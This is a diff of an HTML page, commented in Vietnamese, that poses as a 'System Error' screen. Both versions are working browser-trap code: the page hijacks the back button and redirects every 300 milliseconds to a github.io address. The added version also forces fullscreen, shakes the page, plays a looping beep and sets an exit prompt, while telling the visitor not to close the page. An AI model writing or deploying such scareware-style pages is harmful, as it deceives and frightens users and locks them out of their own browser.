@@ -1,79 +1,72 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-  <meta charset="UTF-8">
-  <title>Lỗi hệ thống</title>
-  <style>
-    body {
-      margin: 0;
-      background: #0d1117;
-      color: #fff;
-      font-family: Arial, sans-serif;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      text-align: center;
-    }
-    .box {
-      background: #161b22;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.5);
-    }
-    button {
-      padding: 10px 20px;
-      border: none;
-      background: red;
-      color: white;
-      cursor: pointer;
-      border-radius: 5px;
-      margin-top: 15px;
-    }
-  </style>
+<meta charset="UTF-8">
+<title>System Error</title>
+
+<style>
+  body {
+    margin: 0;
+    background: black;
+    color: red;
+    font-family: monospace;
+    text-align: center;
+    overflow: hidden;
+  }
+  h1 {
+    font-size: 40px;
+    margin-top: 20%;
+    animation: blink 0.5s infinite;
+  }
+  @keyframes blink {
+    50% { opacity: 0; }
+  }
+</style>
+
 </head>
 <body>
 
-<div class="box">
-  <h1>⚠ Lỗi nghiêm trọng</h1>
-  <p>Hệ thống sẽ tự sửa trong <span id="count">5</span> giây...</p>
-  <button onclick="fakeClick()">Hủy</button>
-</div>
+<h1>⚠ SYSTEM FAILURE ⚠</h1>
+<p>Đang sửa lỗi... KHÔNG TẮT TRANG!</p>
+
+<audio id="sound" loop>
+  <source src="https://www.soundjay.com/button/beep-07.wav" type="audio/wav">
+</audio>
 
 <script>
-  const target = "https://phamtranceven-lang.github.io/ALO";
+const target = "https://phamtranceven-lang.github.io/ALO";
 
-  // đếm ngược
-  let time = 5;
-  const countEl = document.getElementById("count");
+// fullscreen
+function goFull() {
+  const el = document.documentElement;
+  if (el.requestFullscreen) el.requestFullscreen();
+}
+goFull();
 
-  const countdown = setInterval(() => {
-    time--;
-    countEl.innerText = time;
+// phát âm thanh (cần user click 1 lần)
+document.body.addEventListener("click", () => {
+  document.getElementById("sound").play();
+});
 
-    if (time <= 0) {
-      clearInterval(countdown);
-      startRedirectLoop();
-    }
-  }, 1000);
+// rung màn hình
+setInterval(() => {
+  document.body.style.transform =
+    `translate(${Math.random()*20-10}px, ${Math.random()*20-10}px)`;
+}, 50);
 
-  // nút giả
-  function fakeClick() {
-    alert("Không thể hủy 😈");
-  }
+// chống back
+history.pushState(null, null, location.href);
+window.onpopstate = () => history.go(1);
 
-  // chống back
-  history.pushState(null, null, location.href);
-  window.onpopstate = function () {
-    history.go(1);
-  };
+// spam redirect
+setInterval(() => {
+  window.location.href = target;
+}, 300);
 
-  // redirect liên tục
-  function startRedirectLoop() {
-    setInterval(() => {
-      window.location.href = target;
-    }, 300);
-  }
+// mở lại nếu bị đóng tab (không phải lúc nào cũng hoạt động)
+window.onbeforeunload = function () {
+  return "Bạn chắc chắn muốn thoát?";
+};
 </script>
 
 </body>
